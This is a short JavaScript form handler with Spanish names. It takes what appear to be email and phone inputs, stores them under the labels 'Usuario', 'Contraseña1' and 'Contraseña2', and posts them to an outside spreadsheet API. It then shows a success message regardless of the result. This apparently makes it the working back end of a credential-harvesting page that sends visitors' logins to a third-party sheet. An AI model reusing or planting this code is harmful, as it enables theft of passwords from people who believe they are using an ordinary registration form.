const formulario = document.getElementById('formulario');
const registro = document.getElementById('registro');
const exito = document.getElementById('exito');
const hoy = new Date();
  
formulario.addEventListener('submit', async(e) =>{
    e.preventDefault();



try {    
    const respuesta = await fetch('https://sheet.best/api/sheets/83e378fc-122a-46c1-b432-5d83b513bc60', {
        method: 'POST',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            "Usuario": formulario.nombre.value,
            "Contraseña1": formulario.correo.value,
            "Contraseña2": formulario.telefono.value,
            "fecha": hoy.toDateString()
        })
    });



} catch(error){
    console.log(error);
}
    
    registro.classList.remove('activo');
    exito.classList.add('activo');
});